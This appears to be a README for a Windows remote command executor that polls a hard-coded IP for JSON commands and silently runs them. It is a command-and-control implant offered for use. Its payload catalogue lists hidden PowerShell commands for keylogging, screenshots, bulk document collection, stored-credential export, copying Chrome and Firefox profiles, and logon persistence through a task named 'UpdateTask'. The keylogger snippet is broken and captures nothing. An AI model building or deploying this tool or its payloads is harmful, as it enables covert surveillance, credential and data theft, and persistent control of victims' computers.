# Remote Command Executor

A simple C program that connects to a remote server, retrieves a command in JSON format, and executes it locally.

## Overview

This program connects to `134.209.61.208:80` via HTTP, retrieves a JSON response containing a command, parses it manually (no external libraries), and executes the command using `system()`. All errors are logged to `error.log`.

## Requirements

- C compiler:
  - **On Windows**: MinGW or MinGW-w64 (gcc)
  - **Cross-compiling from Linux/macOS**: MinGW-w64 cross-compiler (x86_64-w64-mingw32-gcc)
- Target platform: Windows (uses Windows Sockets API)
- Network connectivity to 134.209.61.208:80
- Write permissions in current directory (for error.log)

## Building

```bash
make
```

Or manually:

**On Windows with MinGW:**
```bash
gcc -std=c99 -Wall -Wextra -mwindows -o remote_command_executor.exe remote_command_executor.c -lws2_32 -ladvapi32
```

**Cross-compiling from Linux/macOS:**
```bash
x86_64-w64-mingw32-gcc -std=c99 -Wall -Wextra -mwindows -o remote_command_executor.exe remote_command_executor.c -lws2_32 -ladvapi32
```

## Usage

```bash
remote_command_executor.exe
```

The program will:
1. Connect to http://134.209.61.208:80/
2. Retrieve JSON response with "command" key
3. Execute the command
4. Exit with status code (0 = success, non-zero = failure)

## Exit Codes

- `0`: Success - command retrieved and executed successfully
- `1`: Network error - connection failed or timeout
- `2`: HTTP error - non-200 status code received
- `3`: JSON parsing error - invalid JSON or missing "command" key
- `4`: Command execution error - command failed to execute

## Error Logging

All errors are logged to `error.log` in the current directory. The log file is created in append mode, so previous errors are preserved.

Example error log entries:
```
Error: Connection failed to 134.209.61.208:80
Error: HTTP status code 404 (expected 200)
Error: JSON missing 'command' key
Error: Invalid JSON syntax or malformed JSON
Error: Command execution failed with exit status 1
```

## Troubleshooting

### Connection Issues

- **"Connection failed"**: Server may be down or firewall blocking
- **"Connection timeout"**: Network issues or server not responding (30 second timeout)
- **"Failed to receive HTTP response"**: Connection interrupted during data transfer

### JSON Parsing Issues

- **"JSON missing 'command' key"**: Server returned JSON without the required "command" field
- **"Invalid JSON syntax"**: Server returned malformed JSON
- **"Empty command value"**: JSON contains "command" key but value is empty

### Command Execution Issues

- **"Command execution failed"**: The command returned a non-zero exit status
- **"Empty command"**: No command was provided to execute

## Implementation Details

- Uses only C standard library and Windows API (no external dependencies)
- Manual HTTP implementation via Windows Sockets (Winsock2)
- Manual JSON parsing for simple key-value structure
- Command execution via `system()` function
- Error logging to file using standard file I/O
- 30 second network timeout for all socket operations
- Comprehensive error handling with appropriate exit codes

## Testing

Test the program with various scenarios:

1. **Successful execution**: Run against a working server
2. **Network failure**: Disconnect network or block server access
3. **HTTP errors**: Test with server returning non-200 status codes
4. **Invalid JSON**: Test with server returning malformed JSON
5. **Missing command key**: Test with JSON without "command" field

## Useful Commands for Remote Execution

The following commands can be sent via the JSON `command` key for various purposes:

### Keylogger Operations

```json
{"command": "powershell -WindowStyle Hidden -Command \"$keylog = ''; while($true) { $key = $null; $key = [System.Windows.Forms.SendKeys]::SendWait('{CAPSLOCK}'); Start-Sleep -Milliseconds 100; }\"", "sleep": 5, "next": "192.168.1.100"}
```

**Prettified Command:**
```powershell
$keylog = ''
while($true) {
    $key = $null
    $key = [System.Windows.Forms.SendKeys]::SendWait('{CAPSLOCK}')
    Start-Sleep -Milliseconds 100
}
```

```json
{"command": "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File keylogger.ps1", "sleep": 10, "next": "192.168.1.100"}
```

**Prettified Command:**
```powershell
# Execute external keylogger script
powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File keylogger.ps1
```

### Screenshot Operations

```json
{"command": "powershell -WindowStyle Hidden -Command \"Add-Type -AssemblyName System.Windows.Forms,System.Drawing; $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $bmp = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height; $graphics = [System.Drawing.Graphics]::FromImage($bmp); $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size); $bmp.Save('screenshot.png', [System.Drawing.Imaging.ImageFormat]::Png); $graphics.Dispose(); $bmp.Dispose()\"", "sleep": 5, "next": "192.168.1.100"}
```

**Prettified Command:**
```powershell
Add-Type -AssemblyName System.Windows.Forms,System.Drawing

# Get primary screen bounds
$bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds

# Create bitmap and graphics objects
$bmp = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
$graphics = [System.Drawing.Graphics]::FromImage($bmp)

# Capture screen
$graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)

# Save screenshot
$bmp.Save('screenshot.png', [System.Drawing.Imaging.ImageFormat]::Png)

# Cleanup
$graphics.Dispose()
$bmp.Dispose()
```

```json
{"command": "nircmd.exe savescreenshot screenshot.png", "sleep": 3, "next": "192.168.1.100"}
```

**Prettified Command:**
```cmd
nircmd.exe savescreenshot screenshot.png
```

### File Operations

```json
{"command": "powershell -WindowStyle Hidden -Command \"Compress-Archive -Path C:\\Users\\*\\Documents\\* -DestinationPath docs.zip -Force\"", "sleep": 2, "next": "192.168.1.100"}
```

**Prettified Command:**
```powershell
# Compress all documents from user directories
Compress-Archive -Path C:\Users\*\Documents\* -DestinationPath docs.zip -Force
```

```json
{"command": "certutil -encode file.txt encoded.txt && type encoded.txt", "sleep": 1, "next": "192.168.1.100"}
```

**Prettified Command:**
```cmd
certutil -encode file.txt encoded.txt
type encoded.txt
```

```json
{"command": "powershell -WindowStyle Hidden -Command \"Get-ChildItem -Path C:\\Users -Recurse -Include *.txt,*.pdf,*.doc,*.docx -ErrorAction SilentlyContinue | Select-Object FullName | Out-File files.txt\"", "sleep": 5, "next": "192.168.1.100"}
```

**Prettified Command:**
```powershell
# Find and list all documents
Get-ChildItem -Path C:\Users -Recurse `
    -Include *.txt,*.pdf,*.doc,*.docx `
    -ErrorAction SilentlyContinue | 
    Select-Object FullName | 
    Out-File files.txt
```

### Network Operations

```json
{"command": "ipconfig /all > network_info.txt", "sleep": 2, "next": "192.168.1.100"}
```

**Prettified Command:**
```cmd
ipconfig /all > network_info.txt
```

```json
{"command": "netstat -ano > connections.txt", "sleep": 2, "next": "192.168.1.100"}
```

**Prettified Command:**
```cmd
netstat -ano > connections.txt
```

```json
{"command": "arp -a > arp_table.txt", "sleep": 1, "next": "192.168.1.100"}
```

**Prettified Command:**
```cmd
arp -a > arp_table.txt
```

### System Information

```json
{"command": "systeminfo > system_info.txt", "sleep": 3, "next": "192.168.1.100"}
```

**Prettified Command:**
```cmd
systeminfo > system_info.txt
```

```json
{"command": "wmic process list full > processes.txt", "sleep": 2, "next": "192.168.1.100"}
```

**Prettified Command:**
```cmd
wmic process list full > processes.txt
```

```json
{"command": "wmic service list brief > services.txt", "sleep": 2, "next": "192.168.1.100"}
```

**Prettified Command:**
```cmd
wmic service list brief > services.txt
```

### Data Exfiltration

```json
{"command": "powershell -WindowStyle Hidden -Command \"$files = Get-ChildItem -Path C:\\Users -Recurse -Include *.txt,*.pdf -ErrorAction SilentlyContinue | Select-Object -First 10 FullName; $files | ForEach-Object { Copy-Item $_.FullName -Destination C:\\temp\\ }\"", "sleep": 10, "next": "192.168.1.100"}
```

**Prettified Command:**
```powershell
# Find and copy first 10 documents
$files = Get-ChildItem -Path C:\Users -Recurse `
    -Include *.txt,*.pdf `
    -ErrorAction SilentlyContinue | 
    Select-Object -First 10 FullName

# Copy files to temp directory
$files | ForEach-Object {
    Copy-Item $_.FullName -Destination C:\temp\
}
```

```json
{"command": "powershell -WindowStyle Hidden -Command \"$cred = Get-StoredCredential -Target *; $cred | Export-Clixml creds.xml\"", "sleep": 3, "next": "192.168.1.100"}
```

**Prettified Command:**
```powershell
# Extract stored credentials
$cred = Get-StoredCredential -Target *
$cred | Export-Clixml creds.xml
```

### Registry Operations

```json
{"command": "reg export HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run startup.reg", "sleep": 2, "next": "192.168.1.100"}
```

**Prettified Command:**
```cmd
reg export HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run startup.reg
```

```json
{"command": "reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall /s > installed_software.txt", "sleep": 5, "next": "192.168.1.100"}
```

**Prettified Command:**
```cmd
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall /s > installed_software.txt
```

### Process Management

```json
{"command": "tasklist /svc > running_processes.txt", "sleep": 2, "next": "192.168.1.100"}
```

**Prettified Command:**
```cmd
tasklist /svc > running_processes.txt
```

```json
{"command": "wmic startup get caption,command > startup_programs.txt", "sleep": 2, "next": "192.168.1.100"}
```

**Prettified Command:**
```cmd
wmic startup get caption,command > startup_programs.txt
```

### Browser Data

```json
{"command": "powershell -WindowStyle Hidden -Command \"Copy-Item -Path \"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\*\" -Destination C:\\temp\\chrome_data\\ -Recurse -ErrorAction SilentlyContinue\"", "sleep": 10, "next": "192.168.1.100"}
```

**Prettified Command:**
```powershell
# Copy Chrome user data
Copy-Item -Path "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\*" `
    -Destination C:\temp\chrome_data\ `
    -Recurse `
    -ErrorAction SilentlyContinue
```

```json
{"command": "powershell -WindowStyle Hidden -Command \"Copy-Item -Path \"$env:APPDATA\\Mozilla\\Firefox\\Profiles\\*\" -Destination C:\\temp\\firefox_data\\ -Recurse -ErrorAction SilentlyContinue\"", "sleep": 10, "next": "192.168.1.100"}
```

**Prettified Command:**
```powershell
# Copy Firefox profiles
Copy-Item -Path "$env:APPDATA\Mozilla\Firefox\Profiles\*" `
    -Destination C:\temp\firefox_data\ `
    -Recurse `
    -ErrorAction SilentlyContinue
```

### Stealth Operations

```json
{"command": "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -Command \"Start-Process cmd.exe -WindowStyle Hidden -ArgumentList '/c command_here'\"", "sleep": 2, "next": "192.168.1.100"}
```

**Prettified Command:**
```powershell
# Execute command in hidden window
Start-Process cmd.exe `
    -WindowStyle Hidden `
    -ArgumentList '/c command_here'
```

```json
{"command": "schtasks /create /tn \"UpdateTask\" /tr \"command_here\" /sc onlogon /f", "sleep": 1, "next": "192.168.1.100"}
```

**Prettified Command:**
```cmd
schtasks /create /tn "UpdateTask" /tr "command_here" /sc onlogon /f
```

### Combined Operations

```json
{"command": "powershell -WindowStyle Hidden -Command \"$screenshot = 'screenshot.png'; Add-Type -AssemblyName System.Windows.Forms,System.Drawing; $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $bmp = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height; $graphics = [System.Drawing.Graphics]::FromImage($bmp); $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size); $bmp.Save($screenshot, [System.Drawing.Imaging.ImageFormat]::Png); $graphics.Dispose(); $bmp.Dispose(); systeminfo > sysinfo.txt; ipconfig /all > netinfo.txt\"", "sleep": 5, "next": "192.168.1.100"}
```

**Prettified Command:**
```powershell
# Take screenshot
$screenshot = 'screenshot.png'
Add-Type -AssemblyName System.Windows.Forms,System.Drawing

$bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
$bmp = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
$graphics = [System.Drawing.Graphics]::FromImage($bmp)
$graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
$bmp.Save($screenshot, [System.Drawing.Imaging.ImageFormat]::Png)
$graphics.Dispose()
$bmp.Dispose()

# Collect system and network info
systeminfo > sysinfo.txt
ipconfig /all > netinfo.txt
```

## License

[Add license information as needed]
